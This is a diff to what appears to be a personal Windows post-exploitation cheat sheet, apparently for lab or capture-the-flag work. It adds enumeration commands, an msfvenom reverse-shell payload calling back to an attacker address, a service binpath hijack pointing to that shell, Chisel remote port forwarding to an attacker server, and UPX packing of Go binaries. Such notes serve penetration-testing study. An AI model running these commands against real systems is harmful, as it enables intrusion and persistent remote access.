@@ -107,6 +107,7 @@ GetUsersSPNs.py 'domain.local/jan:password'
 # System Enumeration
 systeminfo
 windows version registry key print
+.\winPease.exe
 
 # Network Enumeration
 netstat -nat
@@ -117,6 +118,16 @@ net user <user>
 
 # Services Enumeration
 services
+
+# Files Enumeration
+icacls file.txt
+```
+
+## Enumerating Firewall
+
+```powershell
+# Display rules that are off and that blocks outbound traffic
+Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
 ```
 
 ## Abusing groups
@@ -125,8 +136,8 @@ services
 Create/Modify Services
 
 ```powershell
-# MSFVenom Reverse Shell
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe
+# MSFVenom Reverse Shell (Specify x32/x64 bits)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > rev.exe
 
 # Modiying binary
 sc.exe config VMTools binpath="C:\Users\Janrdz\Desktop\shell.exe"
@@ -177,9 +188,24 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 
 ------------------------------------------------------------------------------------------------------
 
-# Advance
- 
+# Port Fordwarding
 
+## Chisel
+
+A port may be unaccessible from outside, but accessible from the internal network. With Chisel we can perform
+remote port forwarding to be able to access that port from outside.
+
+```powershell
+# From the attacker machine
+./chisel server -p 1234 --reverse
+
+# Applying remote port fordwarding  
+.\chisel.exe client 10.10.10.10:1234 R:9512:127.0.0.1:9512
+
+# Check the port
+lsof -i:9512
+```
+ 
 ------------------------------------------------------------------------------------------------------
 
 # Extra
@@ -204,4 +230,12 @@ icacls file.txt
 
 ```shell
 echo "characters" | iconv -t utf-16le | base64 -w 0; echo
+```
+
+# Compilating Lightweight Binaries in Go
+
+```bash
+go build -ldflags "-s -w" .
+du -hc file
+upx file
 ```
